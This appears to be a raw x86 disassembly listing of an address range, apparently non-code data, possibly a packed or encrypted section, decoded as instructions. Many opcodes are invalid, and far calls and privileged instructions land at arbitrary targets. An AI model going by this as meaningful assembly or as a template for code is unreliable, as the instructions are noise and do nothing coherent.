  441141:	pop    es
  441142:	lock fwait
  441144:	add    esi,DWORD PTR [ecx-0x20fbe165]
  44114a:	mov    edi,0xd7df3f4d
  44114f:	data16 mov dl,0xa9
  441152:	mov    esi,0x61c3d352
  441157:	inc    esi
  441158:	jb     0x441151
  44115a:	mov    ecx,0x97727a7
  44115f:	add    eax,DWORD PTR [ecx-0x3d85d906]
  441165:	mov    bl,0x9a
  441167:	and    ecx,ebp
  441169:	aas    
  44116a:	jmp    0x3ca7:0xb3804863
  441171:	xor    eax,0xce47ea30
  441176:	lods   eax,DWORD PTR ds:[esi]
  441177:	lods   al,BYTE PTR ds:[esi]
  441178:	lods   eax,DWORD PTR ds:[esi]
  441179:	cmp    dl,BYTE PTR [ebx+0x48]
  44117c:	icebp  
  44117d:	jno    0x44117a
  44117f:	inc    ebp
  441180:	mov    edx,0x37d99984
  441185:	mov    esi,ebx
  441187:	mov    dh,0x9e
  441189:	or     esi,esi
  44118b:	mov    bl,ch
  44118d:	inc    ecx
  44118e:	imul   ebx,DWORD PTR [esi-0x6765c1e6],0x44
  441195:	fst    DWORD PTR [eax+0x7028f065]
  44119b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44119c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44119d:	ret    
  44119e:	xor    DWORD PTR [edx],0xd
  4411a1:	sbb    dh,BYTE PTR [ebx]
  4411a3:	adc    BYTE PTR [ebx-0x432af3b0],dh
  4411a9:	aas    
  4411aa:	xchg   edx,eax
  4411ab:	push   0x56
  4411ad:	pop    esp
  4411ae:	jp     0x441168
  4411b0:	aaa    
  4411b1:	push   edi
  4411b2:	inc    esi
  4411b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4411b4:	imul   edi,DWORD PTR [eax-0x1690a3d6],0xffffff9a
  4411bb:	int3   
  4411bc:	inc    esp
  4411bd:	retf   
  4411be:	cmc    
  4411bf:	or     eax,0xa7279baf
  4411c4:	ror    ebp,cl
  4411c6:	out    dx,eax
  4411c7:	cmp    bh,BYTE PTR [esi-0x4e]
  4411ca:	cmp    edi,DWORD PTR [edx-0x4f]
  4411cd:	cmp    ecx,ebx
  4411cf:	jne    0x441201
  4411d1:	test   BYTE PTR [edi],bl
  4411d3:	pop    ss
  4411d4:	jge    0x4411fc
  4411d6:	sbb    eax,0x9b31f09d
  4411db:	retf   
  4411dc:	sbb    DWORD PTR [edx+0x3a492465],eax
  4411e2:	mov    DWORD PTR [edi-0x2b],ecx
  4411e5:	outs   dx,DWORD PTR ds:[esi]
  4411e6:	call   0x4637:0x82d5fbd0
  4411ed:	jo     0x4411ba
  4411ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4411f0:	jo     0x4411ae
  4411f2:	into   
  4411f3:	mov    ah,0x8
  4411f5:	mov    WORD PTR [edi],es
  4411f7:	mov    al,ds:0xccec19b5
  4411fc:	jmp    0xd8076c63
  441201:	add    al,0xb
  441203:	inc    ecx
  441204:	cdq    
  441205:	or     ebp,DWORD PTR [ebx*8+0x35e964e0]
  44120c:	xor    al,0xef
  44120e:	call   0x2316:0x2f7240c7
  441215:	pop    edx
  441216:	pusha  
  441217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441218:	aaa    
  441219:	sbb    edi,ecx
  44121b:	jno    0x4411c0
  44121d:	xor    DWORD PTR [ebp-0x6f],edi
  441220:	mov    bl,0xc7
  441222:	mov    WORD PTR [eax+0x73],ss
  441225:	adc    ebp,edi
  441227:	jb     0x44128f
  441229:	je     0x4411b9
  44122b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44122c:	psllw  mm1,QWORD PTR [ebx]
  44122f:	cmp    dl,BYTE PTR [ecx-0x48d5a250]
  441235:	mov    bh,0x3f
  441237:	adc    DWORD PTR [ebx-0x15],0x4e4a4f1a
  44123e:	xchg   edi,eax
  44123f:	stos   DWORD PTR es:[edi],eax
  441240:	push   esp
  441241:	pop    eax
  441242:	shr    BYTE PTR [edi+0x22],0x1d
  441246:	call   0x4f5b:0xc2c682d9
  44124d:	xor    ch,BYTE PTR [esi+0x452555a7]
  441253:	sbb    esi,0xb20bc1be
  441259:	dec    edx
  44125a:	or     DWORD PTR [eax],edi
  44125c:	push   esi
  44125d:	clc    
  44125e:	or     bh,cl
  441260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441261:	or     eax,DWORD PTR [ebx]
  441263:	cmp    ecx,edx
  441265:	push   esp
  441266:	enter  0xf98a,0xa8
  44126a:	test   BYTE PTR [ebx],dl
  44126c:	add    edx,DWORD PTR [edi-0x39]
  44126f:	popa   
  441270:	jb     0x441235
  441272:	inc    eax
  441273:	int3   
  441274:	xchg   ax,ax
  441276:	shl    BYTE PTR [eax+0x5302ca3e],0x1f
  44127d:	sub    eax,DWORD PTR ds:0x9abde21b
  441283:	sub    DWORD PTR [edi-0x541f62e1],eax
  441289:	cmp    BYTE PTR [eax+0x4f96b9a7],cl
  44128f:	(bad)  
  441290:	fsub   QWORD PTR [edi]
  441292:	loop   0x44127e
  441294:	mov    bh,0x2e
  441296:	xchg   edi,eax
  441297:	ret    0x770b
  44129a:	pop    edx
  44129b:	out    0x33,al
  44129d:	stos   DWORD PTR es:[edi],eax
  44129e:	mov    edi,DWORD PTR [edx-0x62709fd]
  4412a4:	inc    eax
  4412a5:	mov    dh,BYTE PTR [ecx-0x4f3fe95d]
  4412ab:	jae    0x441293
  4412ad:	popa   
  4412ae:	call   0x30b3:0x4d47748a
  4412b5:	jns    0x4412c9
  4412b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4412b8:	add    BYTE PTR [eax-0x1d],cl
  4412bb:	sbb    ah,bl
  4412bd:	inc    edx
  4412be:	and    BYTE PTR [ebx-0x56138b4b],cl
  4412c4:	mov    ch,0xf8
  4412c6:	stos   BYTE PTR es:[edi],al
  4412c7:	(bad)  
  4412c8:	aas    
  4412c9:	sbb    edi,edx
  4412cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4412cc:	pop    es
  4412cd:	xor    bl,BYTE PTR [ecx]
  4412cf:	jb     0x441294
  4412d1:	sub    dl,BYTE PTR [eax+0xe57b36e]
  4412d7:	jns    0x4412f8
  4412d9:	xor    al,0x66
  4412db:	test   eax,0xa774a342
  4412e0:	cmp    eax,0x9c342c59
  4412e5:	jge    0x4412b9
  4412e7:	xchg   esi,eax
  4412e8:	mov    bl,0xae
  4412ea:	xchg   edx,eax
  4412eb:	jge    0x441286
  4412ed:	mov    bl,0x5c
  4412ef:	mov    ds:0xa75a266e,eax
  4412f4:	mov    DWORD PTR [esi-0x51],esi
  4412f7:	xor    al,0x88
  4412f9:	and    bh,BYTE PTR [eax-0x2b]
  4412fc:	mov    dl,0xa5
  4412fe:	aam    0x87
  441300:	dec    ebp
  441301:	arpl   WORD PTR ds:0x60b8071,sp
  441307:	int3   
  441308:	sub    eax,0x8683fef8
  44130d:	sub    BYTE PTR [edx-0x3b3658b9],bl
  441313:	sbb    al,BYTE PTR [ebx+0x9]
  441316:	xor    eax,0x42512ea7
  44131b:	xor    eax,0xe8808659
  441320:	mov    ebp,0xbf675173
  441325:	imul   ebp,DWORD PTR [ecx+0x1e69145e],0xffffffa7
  44132c:	adc    eax,0xa7168223
  441331:	call   0x50f695d8
  441336:	mov    es:0x74a9a04a,al
  44133c:	push   edx
  44133d:	or     ecx,DWORD PTR ds:0x118b9e14
  441343:	mov    al,0x51
  441345:	xchg   edx,eax
  441346:	call   0x57bf:0xda070aa0
  44134d:	add    al,0xfa
  44134f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441350:	push   0xa0ccf261
  441355:	push   es
  441356:	je     0x441310
  441358:	mov    dl,0x3f
  44135a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44135b:	mov    ecx,0x6cf54c46
  441360:	mov    cl,0x16
  441362:	ss fwait
  441364:	out    0x4b,al
  441366:	add    DWORD PTR [eax],eax
  441368:	popf   
  441369:	mov    ebx,0x7eb536ed
  44136e:	mov    DWORD PTR [esi],esp
  441370:	test   al,0x50
  441372:	dec    edx
  441373:	mov    DWORD PTR [esi],esi
  441375:	cwde   
  441376:	push   ebp
  441377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441379:	xchg   ecx,eax
  44137a:	sbb    dl,0x26
  44137d:	jb     0x4413b9
  44137f:	scas   eax,DWORD PTR es:[edi]
  441380:	dec    esp
  441381:	leave  
  441382:	test   BYTE PTR [edx+0x40],al
  441385:	sbb    ebx,edx
  441387:	xor    al,0x52
  441389:	mov    edi,0x2dece46a
  44138e:	jne    0x4413f6
  441390:	inc    eax
  441391:	or     esp,DWORD PTR [esi]
  441393:	test   eax,0x5c6b59a
  441398:	scas   al,BYTE PTR es:[edi]
  441399:	sbb    bh,bh
  44139b:	cs jb  0x441363
  44139e:	mov    bh,0xcc
  4413a0:	jne    0x441337
  4413a2:	fcom   st(4)
  4413a4:	sbb    esi,ebp
  4413a6:	cwde   
  4413a7:	addr16 xchg esp,eax
  4413a9:	xor    al,0xbc
  4413ab:	clc    
  4413ac:	lods   eax,DWORD PTR ds:[esi]
  4413ad:	pop    ebx
  4413ae:	call   0x6414:0xd58868a3
  4413b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4413b6:	fsub   QWORD PTR [edi-0x3bcdf8c7]
  4413bc:	mov    WORD PTR [edx],?
  4413be:	or     BYTE PTR [ebx],0xb2
  4413c1:	xchg   ecx,eax
  4413c2:	cdq    
  4413c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4413c4:	ds stc 
  4413c6:	inc    ebx
  4413c7:	adc    ah,dh
  4413c9:	or     ebx,DWORD PTR [edx]
  4413cb:	add    ebx,DWORD PTR [esi+0x52]
  4413ce:	imul   esi,DWORD PTR [ecx-0x5485353f],0xbdbed6ae
  4413d8:	jb     0x4413a3
  4413da:	cmp    esp,0xa77331b8
  4413e0:	xor    esp,DWORD PTR [ecx-0x4251cfb5]
  4413e6:	mov    ch,0xec
  4413e8:	mov    dl,0xc5
  4413ea:	stos   BYTE PTR es:[edi],al
  4413eb:	fmul   QWORD PTR [ecx]
  4413ed:	push   eax
  4413ee:	in     al,dx
  4413ef:	mov    ds:0x258b0ce0,al
  4413f4:	mov    al,0xe9
  4413f6:	and    BYTE PTR [edi+0x71],al
  4413f9:	test   BYTE PTR [edi],0x90
  4413fc:	mov    dl,0x66
  4413fe:	hlt    
  4413ff:	adc    DWORD PTR [eax+0x6f],esp
  441402:	popf   
  441403:	pusha  
  441404:	jle    0x441410
  441406:	cmp    al,0xa9
  441408:	popf   
  441409:	sbb    DWORD PTR ds:0xd2b99c5,ebx
  44140f:	(bad)  
  441410:	scas   eax,DWORD PTR es:[edi]
  441411:	paddsw mm4,QWORD PTR [edx+0x39968a31]
  441418:	enter  0x3eab,0xe7
  44141c:	inc    edx
  44141d:	or     ebx,eax
  44141f:	nop
  441420:	jmp    0xb36e9717
  441425:	jg     0x4413c1
  441427:	mov    dh,0x53
  441429:	jns    0x4413d1
  44142b:	add    DWORD PTR [esp+edx*4+0x34199ee5],0x1a
  441433:	jl     0x441490
  441435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441436:	mov    esp,0x9d92a100
  44143b:	(bad)
  44143e:	jb     0x441430
  441440:	ret    0x1cef
  441443:	inc    ecx
  441444:	dec    edi
  441445:	or     edi,edi
  441447:	xor    eax,0x9d81afd3
  44144c:	scas   eax,DWORD PTR es:[edi]
  44144d:	in     al,dx
  44144e:	mov    DWORD PTR [eax+0x37],edi
  441451:	call   0xd21a:0x562b0edf
  441458:	pop    ecx
  441459:	fmul   DWORD PTR [ecx+ebp*4]
  44145c:	ret    
  44145d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44145e:	push   ds
  44145f:	leave  
  441460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441461:	or     esi,DWORD PTR [ebx]
  441463:	and    dh,BYTE PTR [eax-0x4ddf7b2b]
  441469:	dec    esi
  44146a:	es sub eax,0xfcc6f6b9
  441470:	lds    eax,FWORD PTR [eax+edi*1]
  441473:	sbb    BYTE PTR [edx+eiz*1],0x9a
  441477:	int    0xad
  441479:	xor    DWORD PTR [edi-0x1b864de7],ebx
  44147f:	test   BYTE PTR [ecx-0x611cb221],bh
  441485:	add    eax,0x9844b055
  44148a:	fcomi  st,st(7)
  44148c:	or     dl,BYTE PTR [edx+0x4b005739]
  441492:	xchg   ebp,eax
  441493:	xchg   edx,eax
  441494:	push   0x3
  441496:	loopne 0x44149c
  441498:	popf   
  441499:	cld    
  44149a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44149b:	add    dh,BYTE PTR [edx]
  44149d:	(bad)  
  44149e:	fs in  eax,dx
  4414a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4414a1:	inc    eax
  4414a2:	popa   
  4414a3:	pop    edi
  4414a4:	fs or  ebp,esi
  4414a7:	mov    edx,0x89f90e58
  4414ac:	xchg   ecx,eax
  4414ad:	or     edi,DWORD PTR [ebx]
  4414af:	adc    ah,BYTE PTR [ebp+0x14562001]
  4414b5:	adc    bh,ch
  4414b7:	out    0xae,eax
  4414b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4414ba:	xor    edi,DWORD PTR [ebx+0x75]
  4414bd:	gs inc edi
  4414bf:	ror    BYTE PTR [bx+di+0x478],cl
  4414c4:	es or  edx,edx
  4414c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4414c8:	out    dx,eax
  4414c9:	stos   BYTE PTR es:[edi],al
  4414ca:	ins    DWORD PTR es:[edi],dx
  4414cb:	sbb    BYTE PTR ds:0xf7029a49,ch
  4414d1:	ja     0x4414ae
  4414d3:	fild   QWORD PTR [esi]
  4414d5:	cmp    eax,0xcc27a796
  4414da:	loope  0x441482
  4414dc:	imul   esp,DWORD PTR [edi+0x51],0x7
  4414e0:	mov    bl,0x7a
  4414e2:	int    0x59
  4414e4:	ror    BYTE PTR [eax+ecx*4-0x49],cl
  4414e8:	bound  ebx,QWORD PTR [eax]
  4414ea:	inc    esp
  4414eb:	dec    ecx
  4414ec:	jmp    0x87c62bfc
  4414f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4414f2:	or     BYTE PTR cs:[esi],dh
  4414f5:	inc    esp
  4414f6:	call   0x3eb4:0xb60bc1a
  4414fd:	in     eax,0x4f
  4414ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441500:	call   0x64fc:0x714a4d73
  441507:	cmp    DWORD PTR [ecx-0x2f2d0b3],0x902dc8b
  441511:	fadd   DWORD PTR [edx+0x28b632a7]
  441517:	mov    bl,0x3b
  441519:	pop    ecx
  44151a:	adc    eax,0x54b5b080
  44151f:	xchg   esp,eax
  441520:	pop    ebx
  441521:	ror    edx,cl
  441523:	(bad)  
  441524:	adc    DWORD PTR gs:[edx],eax
  441527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441528:	jmp    0x7f74ca3a
  44152d:	scas   al,BYTE PTR es:[edi]
  44152e:	and    edx,esp
  441530:	push   eax
  441531:	xchg   BYTE PTR [edx-0x7defcfcb],bl
  441537:	adc    BYTE PTR [esi+0x16],dl
  44153a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44153c:	icebp  
  44153d:	cli    
  44153e:	mov    BYTE PTR [edx],ah
  441540:	xlat   BYTE PTR ds:[ebx]
  441541:	jp     0x44151e
  441543:	push   ebp
  441544:	scas   eax,DWORD PTR es:[edi]
  441545:	adc    dh,cl
  441547:	xor    dl,dh
  441549:	jmp    0xcd600d60
  44154e:	pop    eax
  44154f:	mov    al,ds:0xa20f688e
  441554:	gs sti 
  441556:	int    0xb3
  441558:	jb     0x4415aa
  44155a:	xchg   ebx,eax
  44155b:	jno    0x4414f4
  44155d:	ror    DWORD PTR [eax],0x27
  441560:	(bad)  
  441561:	repz les esi,FWORD PTR [ecx-0x2fe8f730]
  441568:	int    0x5b
  44156a:	pop    edi
  44156b:	in     al,0x2a
  44156d:	test   BYTE PTR [ebx-0xc],cl
  441570:	mov    dl,0xae
  441572:	pop    ebx
  441573:	leave  
  441574:	cmp    cl,ch
  441576:	mov    al,0x2e
  441578:	sbb    eax,0x8a719e5
  44157d:	ins    BYTE PTR es:[edi],dx
  44157e:	xchg   ebx,eax
  44157f:	shr    dl,1
  441581:	cwde   
  441582:	loope  0x441565
  441584:	mov    dl,0x7
  441586:	inc    esp
  441587:	mov    dl,0xcd
  441589:	stc    
  44158a:	test   DWORD PTR [esi],0xf6760ab4
  441590:	pushf  
  441591:	push   edx
  441592:	popw   es
  441594:	ja     0x441579
  441596:	pop    es
  441597:	adc    BYTE PTR [edx+0x551de43e],dh
  44159d:	(bad)  
  44159e:	jne    0x441586
  4415a0:	or     bx,cx
  4415a3:	mov    dh,0x19
  4415a5:	adc    dh,BYTE PTR [ebx+0x61]
  4415a8:	pusha  
  4415a9:	clc    
  4415aa:	add    dh,BYTE PTR [edx+0x506e18b2]
  4415b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4415b1:	xchg   BYTE PTR [edi-0xa],dh
  4415b4:	push   ss
  4415b5:	add    dh,dl
  4415b7:	enter  0xcf29,0x1d
  4415bb:	mov    ds:0xa85ba5f2,al
  4415c0:	pop    ebx
  4415c1:	jo     0x44159c
  4415c3:	(bad)  
  4415c4:	repz xchg esp,eax
  4415c6:	test   ch,ch
  4415c8:	push   0xffffff81
  4415ca:	pop    edx
  4415cb:	jne    0x301833bb
  4415d1:	or     bl,BYTE PTR [eax-0x7b]
  4415d4:	jmp    0xe4c2:0x9f5b15c6
  4415db:	pop    edi
  4415dc:	pop    esp
  4415dd:	(bad)  
  4415de:	mov    eax,ds:0xa70be071
  4415e3:	sar    BYTE PTR [ecx],0xcf
  4415e6:	mov    al,0x78
  4415e8:	stc    
  4415e9:	or     edx,esi
  4415eb:	pop    ebp
  4415ec:	inc    edx
  4415ed:	xor    ecx,DWORD PTR [ebx]
  4415ef:	mov    dh,bh
  4415f1:	push   ss
  4415f2:	mov    DWORD PTR [edi-0x51658e52],ebp
  4415f8:	dec    edi
  4415f9:	stc    
  4415fa:	pushf  
  4415fb:	mov    esi,0x872d344b
  441600:	aaa    
  441601:	ins    BYTE PTR es:[edi],dx
  441602:	clc    
  441603:	mov    edx,0x285ccbf1
  441608:	retf   
  441609:	rol    BYTE PTR [edx],1
  44160b:	and    ebp,eax
  44160d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44160e:	call   0x17c0:0x381a7160
  441615:	pop    ss
  441616:	jno    0x4415bf
  441618:	je     0x44168b
  44161a:	xchg   edi,eax
  44161b:	das    
  44161c:	push   ebx
  44161d:	mov    ecx,0xa38ce439
  441622:	or     esp,DWORD PTR [edi]
  441624:	int    0xa4
  441626:	add    al,0x1
  441628:	mov    ebp,0x6ea75d41
  44162d:	aam    0x26
  44162f:	jl     0x44168e
  441631:	rol    al,0x3d
  441634:	mov    dl,0x68
  441636:	and    eax,0x15e73915
  44163b:	iret   
  44163c:	adc    ecx,DWORD PTR [eax]
  44163e:	mov    eax,ds:0x62f0dcec
  441643:	xchg   ebp,eax
  441644:	add    DWORD PTR [eax-0x6a0486fe],ecx
  44164a:	call   0x32fc:0xfc1c2bb2
  441651:	and    esp,DWORD PTR [ebx-0x73f47eb5]
  441657:	xor    edi,esp
  441659:	rep ins BYTE PTR es:[edi],dx
  44165b:	imul   eax,DWORD PTR [edi+0x22469d4a],0xffffffb8
  441662:	sbb    DWORD PTR [ebx-0xe],edx
  441665:	and    al,0x39
  441667:	xchg   ebx,eax
  441668:	mov    cl,BYTE PTR [ebx]
  44166a:	pop    esp
  44166b:	inc    edi
  44166c:	bound  eax,QWORD PTR [ecx]
  44166e:	lods   eax,DWORD PTR ds:[esi]
  44166f:	test   DWORD PTR ds:0xfdf59a27,ebx
  441675:	dec    ebx
  441676:	jb     0x441672
  441678:	cdq    
  441679:	ss jl  0x441623
  44167c:	inc    esp
  44167d:	xchg   DWORD PTR [ebp-0x22],edi
  441680:	stos   BYTE PTR es:[edi],al
  441681:	aas    
  441682:	retf   0xb27d
  441685:	cmp    eax,0x16b04327
  44168a:	jnp    0x4416d4
  44168c:	stc    
  44168d:	push   ss
  44168e:	sbb    eax,eax
  441690:	xor    DWORD PTR [eax-0x7d],ecx
  441693:	inc    ebp
  441694:	inc    ebp
  441695:	push   edx
  441696:	dec    edx
  441697:	lds    ebx,FWORD PTR [esi+0x21789bdf]
  44169d:	popa   
  44169e:	aad    0x41
  4416a0:	cmc    
  4416a1:	mov    cl,0xea
  4416a3:	(bad)  
  4416a5:	xor    edi,DWORD PTR ds:0x74af320f
  4416ab:	sub    ebx,esi
  4416ad:	das    
  4416ae:	push   cs
  4416af:	data16 mov dl,0x13
  4416b2:	test   edx,esi
  4416b4:	add    eax,0xd274d14d
  4416b9:	or     esp,DWORD PTR [eax-0x5c]
  4416bc:	adc    BYTE PTR [ecx-0x18],bl
  4416bf:	dec    edx
  4416c0:	cmp    BYTE PTR [edx-0x67],0xe9
  4416c4:	rdtsc  
  4416c6:	inc    ebx
  4416c8:	inc    ebp
  4416c9:	mov    bl,0x6f
  4416cb:	xor    DWORD PTR [edx],0xb
  4416ce:	cmp    bh,dh
  4416d0:	sti    
  4416d1:	pop    ss
  4416d2:	jae    0x4416af
  4416d4:	dec    edi
  4416d5:	cs loopne 0x441658
  4416d8:	mov    bl,0xea
  4416da:	ins    BYTE PTR es:[edi],dx
  4416db:	enter  0xbe87,0x5f
  4416df:	clc    
  4416e0:	pop    ebp
  4416e1:	mov    WORD PTR [edx+0xfa42e89],gs
  4416e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4416e8:	shr    DWORD PTR [ebp+0x42],cl
  4416eb:	push   0xbdb57d6c
  4416f0:	mov    dl,0xaf
  4416f2:	jg     0x44173d
  4416f4:	xchg   ebx,eax
  4416f5:	push   es
  4416f6:	xor    DWORD PTR [esi],0xcc2d0bcc
  4416fc:	sar    edx,0xa4
  4416ff:	dec    edi
  441700:	fwait
  441701:	inc    esp
  441702:	call   0x46fc:0xaf57dbe1
  441709:	popa   
  44170a:	out    dx,al
  44170b:	mov    al,ds:0x888256cc
  441710:	mov    BYTE PTR [ecx-0x4f8dda22],bl
  441716:	push   esi
  441717:	jmp    0xbcd4d2ce
  44171c:	(bad)  
  44171d:	mov    esp,0xb64568f
  441722:	adc    edx,DWORD PTR [ebp+0x229130d]
  441728:	fidivr WORD PTR [edi+0x6026c19a]
  44172e:	loop   0x441706
  441730:	or     BYTE PTR [ebx-0x34],bh
  441733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441734:	pop    es
  441735:	mov    esp,0x7d37e168
  44173a:	dec    esp
  44173b:	repz mov dl,0x2f
  44173e:	pop    ebx
  44173f:	push   0x77a0ab0f
  441744:	cmp    dl,BYTE PTR [ebx+0x7705a439]
  44174a:	and    bh,BYTE PTR [ebx+0x32af8f3]
  441750:	ffree  st(2)
  441752:	test   DWORD PTR [ebx+0x1715d52a],ebx
  441758:	pop    ss
  441759:	mov    WORD PTR [esi-0x7c],?
  44175c:	mov    ds:0x17141db,al
  441761:	adc    al,0x90
  441763:	fiadd  DWORD PTR [ebx+ecx*1+0x1c2c5ece]
  44176a:	fwait
  44176b:	xchg   BYTE PTR [edx+0x28b783e6],dh
  441771:	mov    al,0x6d
  441773:	js     0x441745
  441775:	or     esi,DWORD PTR [esi-0x6a]
  441778:	xor    al,0xea
  44177a:	jmp    0x6b60:0x9ad30fac
  441781:	fcom   QWORD PTR [edi]
  441783:	stc    
  441784:	sub    DWORD PTR ds:0x7ef79ecf,esp
  44178a:	sbb    dh,BYTE PTR ds:0xd3a6ca87
  441790:	jp     0x4417d4
  441792:	call   0x125d:0x256fecf
  441799:	and    DWORD PTR [ebx-0x22],0x74
  44179d:	or     ecx,DWORD PTR [esi-0x7b]
  4417a0:	lds    esp,FWORD PTR [ecx+0x49bc0c7d]
  4417a6:	call   0xe579:0x6d1749b9
  4417ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4417ae:	jnp    0x44176a
  4417b0:	and    al,0x8d
  4417b2:	ja     0x44175b
  4417b4:	mov    dh,0x85
  4417b6:	sbb    edx,eax
  4417b8:	mov    ch,0xbd
  4417ba:	test   BYTE PTR ds:0xe2c280f0,bl
  4417c0:	repnz and al,0x45
  4417c3:	sti    
  4417c4:	addr16 push edx
  4417c6:	call   0xcf57:0x19d03bea
  4417cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4417ce:	xchg   DWORD PTR [esi-0x79e5274f],ebx
  4417d4:	sub    DWORD PTR [ebx-0x872423],ecx
  4417da:	push   es
  4417db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4417dc:	inc    eax
  4417dd:	loopne 0x44183f
  4417df:	jmp    0x8db3:0x13f0914b
  4417e6:	mov    ebx,0x1129ebc1
  4417eb:	xlat   BYTE PTR ds:[ebx]
  4417ec:	xchg   edx,eax
  4417ed:	stc    
  4417ee:	shr    BYTE PTR [edx+eiz*1+0x3219cf81],cl
  4417f5:	arpl   WORD PTR [edx],dx
  4417f7:	jge    0x441811
  4417f9:	fs call 0x96ca:0xf6fe3da2
  441801:	cmp    al,0xe9
  441803:	(bad)  [esi-0x43c0ad8f]
  441809:	or     ecx,DWORD PTR [ecx]
  44180b:	sbb    ah,dh
  44180d:	push   ebx
  44180e:	test   al,0xc0
  441810:	rcr    DWORD PTR [ebx],1
  441812:	xchg   ebp,eax
  441813:	jnp    0x44180b
  441815:	fld    TBYTE PTR [ecx+0x2c847234]
  44181b:	jg     0x441824
  44181d:	or     ebx,DWORD PTR [esp+edx*2]
  441820:	lahf   
  441821:	xor    eax,0x6e3654c
  441826:	xchg   ecx,ebp
  441828:	shl    BYTE PTR [ebp+0x117883da],cl
  44182e:	es dec edx
  441830:	cmc    
  441831:	or     ebp,DWORD PTR [edx-0x77]
  441834:	or     DWORD PTR [esi],ecx
  441836:	lea    edx,[esi*4+0x636f9db4]
  44183d:	or     DWORD PTR [esi-0x13],esp
  441840:	loop   0x441878
  441842:	test   bh,ah
  441844:	out    0xb,eax
  441846:	push   edi
  441847:	mov    BYTE PTR ds:0x952715ba,ch
  44184d:	enter  0x5c9a,0xaa
  441851:	je     0x4417f2
  441853:	adc    eax,0xa7e470b8
  441858:	aaa    
  441859:	adc    ecx,0x58bea4d0
  44185f:	out    dx,al
  441860:	mov    dl,0xab
  441862:	ret    0xdbc
  441865:	xchg   edx,eax
  441866:	inc    ebp
  441867:	test   al,0x79
  441869:	add    al,0x59
  44186b:	adc    DWORD PTR [esi+ebx*2],edx
  44186e:	cli    
  44186f:	fisub  DWORD PTR [eax-0x70a6e409]
  441875:	jecxz  0x4418b8
  441877:	cmp    cl,al
  441879:	aas    
  44187a:	ficomp DWORD PTR [edx]
  44187c:	std    
  44187d:	jno    0x44181a
  44187f:	cs push ecx
  441881:	or     edx,DWORD PTR [ebx+0x7f66bfdc]
  441887:	hlt    
  441888:	inc    ecx
  441889:	xor    DWORD PTR [edx+0xec0234c],ebx
  44188f:	xchg   edx,eax
  441890:	pop    esi
  441891:	jno    0x441870
  441893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441894:	sbb    eax,0x1699161c
  441899:	(bad)  
  44189a:	and    bl,BYTE PTR [edi]
  44189c:	jge    0x441863
  44189e:	call   0x3d5e:0x52e3e940
  4418a5:	fsub   DWORD PTR [ebx+ebx*2-0x28]
  4418a9:	or     edx,DWORD PTR [ebp-0x796d2c2a]
  4418af:	out    0x94,eax
  4418b1:	ret    0xc4a6
  4418b4:	imul   ecx,DWORD PTR [ebx],0x457920cd
  4418ba:	clc    
  4418bb:	push   DWORD PTR [ecx+0x4ba8acfb]
  4418c1:	sbb    edx,esi
  4418c3:	stc    
  4418c4:	repnz leave 
  4418c6:	push   edi
  4418c7:	fisub  WORD PTR [ebx-0x368f656a]
  4418cd:	jno    0x44190e
  4418cf:	std    
  4418d0:	jno    0x441926
  4418d2:	imul   edi
  4418d4:	clc    
  4418d5:	sbb    BYTE PTR [edx+0x1f48300],0xc1
  4418dc:	cs jae 0x441879
  4418df:	data16 mov al,ds:0x5a087c4f
  4418e5:	in     al,dx
  4418e6:	hlt    
  4418e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4418e8:	shl    bh,cl
  4418ea:	sar    DWORD PTR [eax-0x5e],1
  4418ed:	and    cl,bl
  4418ef:	sub    dh,BYTE PTR [ebp+0x64adccd1]
  4418f5:	adc    eax,0xbcb1ae1a
  4418fa:	and    eax,0x1c516ba7
  4418ff:	shl    BYTE PTR [edx],1
  441901:	dec    eax
  441902:	adc    al,BYTE PTR ds:0xf6a34daf
  441908:	jb     0x441945
  44190a:	inc    edi
  44190b:	pop    edi
  44190c:	iret   
  44190d:	and    eax,0x247aa78e
  441912:	nop
  441913:	dec    edi
  441914:	xor    DWORD PTR [edi-0x68],edx
  441917:	sub    DWORD PTR [edx-0x2213d9b0],esi
  44191d:	cli    
  44191e:	pop    edi
  44191f:	pop    eax
  441920:	aas    
  441921:	or     ebx,DWORD PTR [ebp-0x4a]
  441924:	call   0x81ddb868
  441929:	call   0x47a7:0x23d3
  44192f:	aaa    
  441930:	call   DWORD PTR [eax-0x1b]
  441933:	or     DWORD PTR [eax],0xffffffcd
